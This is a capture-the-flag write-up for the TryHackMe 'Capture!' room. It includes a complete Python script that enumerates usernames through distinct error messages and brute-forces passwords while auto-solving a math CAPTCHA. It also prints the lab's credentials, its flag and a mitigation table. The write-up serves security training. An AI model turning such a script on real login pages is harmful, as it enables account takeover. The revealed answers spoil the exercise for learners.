# CTF Write-Up: [Capture!](https://tryhackme.com/room/capture)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flag

<details>
<summary>Flag</summary>

`7df2eabce36f02ca8ed7f237f77ea416`

</details>

---

## 1. Reconnaissance

### Nmap Scan

```
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Fingerprinting (Wappalyzer)

| Component | Version |
|---|---|
| Framework | Flask 2.2.2 |
| Language | Python 3.8.10 |

Navigated to `http://<IP_ADDRESS>/login` — a simple username/password login form.

---

## 2. Understanding the Target

Intercepted the login POST request with Burp Suite:

```
POST /login HTTP/1.1
Host: <IP_ADDRESS>
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

Key observations:

- **Different error messages** depending on whether the username or password is wrong:
  - `"The user 'x' does not exist"` → invalid username
  - `"Invalid password for user 'x'"` → valid username, wrong password
- After several failed attempts, a **math CAPTCHA** is injected into the response: e.g. `478 * 70 = ?`
- This breaks standard tools like **Hydra** which can't solve dynamic CAPTCHAs

Two wordlists were provided in the task files:
- `usernames.txt` 
- `passwords.txt` 

---

## 3. Custom Exploit

Standard brute-force tools fail here because:
1. The CAPTCHA changes every request
2. Credentials and the CAPTCHA answer must be submitted together in one request

A custom Python script was written to handle both phases:

> Script developed with the assistance of [Claude](https://claude.ai)

```
#!/usr/bin/env python3
"""
bypass_login.py — Capture! (TryHackMe)
Phase 1: Username enumeration via different error messages
Phase 2: Password bruteforce with live CAPTCHA solving
"""

import requests, re, sys

TARGET    = f"http://{sys.argv[1]}/login" if len(sys.argv) > 1 else "http://<IP_ADDRESS>/login"
USER_FILE = "usernames.txt"
PASS_FILE = "passwords.txt"

session = requests.Session()

def solve_captcha(html):
    m = re.search(r"(\d+)\s*([+\-*\/])\s*(\d+)", html)
    return str(eval(m.group(0))) if m else None

def post(username, password, captcha=None):
    data = {"username": username, "password": password}
    if captcha:
        data["captcha"] = captcha
    r = session.post(TARGET, data=data, allow_redirects=True)
    # If CAPTCHA triggered mid-flight, solve and resubmit
    if not captcha and re.search(r"\d+\s*[+\-*\/]\s*\d+", r.text):
        ans = solve_captcha(r.text)
        if ans:
            data["captcha"] = ans
            r = session.post(TARGET, data=data, allow_redirects=True)
    return r.text

session.get(TARGET)  # establish session cookie

# ── Phase 1: Username enumeration ──────────────────────────────────────────
valid_user = None
with open(USER_FILE) as f:
    for i, line in enumerate(f, 1):
        user = line.strip()
        html = post(user, "boguspassword_xyz")
        if "invalid password" in html.lower():
            print(f"[+] Valid username: {user}  (attempt {i})")
            valid_user = user
            break
        print(f"[-] {i} {user}", end="\r")

if not valid_user:
    sys.exit("Username not found.")

# ── Phase 2: Password bruteforce ───────────────────────────────────────────
with open(PASS_FILE) as f:
    for i, line in enumerate(f, 1):
        pwd = line.strip()
        html = post(valid_user, pwd)
        if "invalid password" in html.lower() \
        or "does not exist" in html.lower() \
        or "invalid captcha" in html.lower():
            print(f"[-] {i} {pwd}", end="\r")
            continue
        print(f"\n[+] Password found: {pwd}  (attempt {i})")
        flag = re.search(r"THM\{[^}]+\}|[a-f0-9]{32}", html)
        if flag:
            print(f"[★] FLAG: {flag.group(0)}")
        else:
            print(html[300:800])
        break
```

### Running the Script

```
python3 bypass_login.py <IP_ADDRESS>
```

```
[+] Valid username: natalie  (attempt 307)
[-] 343 147852369re
[+] Password found: sk8board  (attempt 344)
[★] FLAG: 7df2eabce36f02ca8ed7f237f77ea416
```

> ⚠️ A false positive (`snowman`) was initially triggered because `"Invalid captcha"` responses weren't being filtered, fixed by adding `"invalid captcha"` to the skip conditions.

---

## 4. Attack Chain

```
Nmap Scan
    └─► Port 80 — Flask login form

Burp Suite analysis
    └─► Different error messages → username enumeration possible
    └─► Math CAPTCHA after N attempts → Hydra unusable

Custom bypass_login.py
    └─► Phase 1: enumerate username → natalie  (attempt 307)
    └─► Phase 2: bruteforce password → sk8board (attempt 343)
    └─► CAPTCHA auto-solved each request

Login as natalie:sk8board
    └─► Flag returned in authenticated response
```

---

## 5. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | Different error messages for invalid user vs invalid password | Username enumeration | Return a single generic error: `"Invalid credentials"` |
| 2 | No account lockout, only rate-limited with a solvable CAPTCHA | Password bruteforce | Implement exponential backoff + lockout after N failures |
| 3 | Simple math CAPTCHA | Trivially bypassed by script | Use a proper CAPTCHA service (e.g. hCaptcha, reCAPTCHA) |
| 4 | Weak password in use | Credential compromise | Enforce a strong password policy |

---

*Capture! — TryHackMe | Rooted ✅*
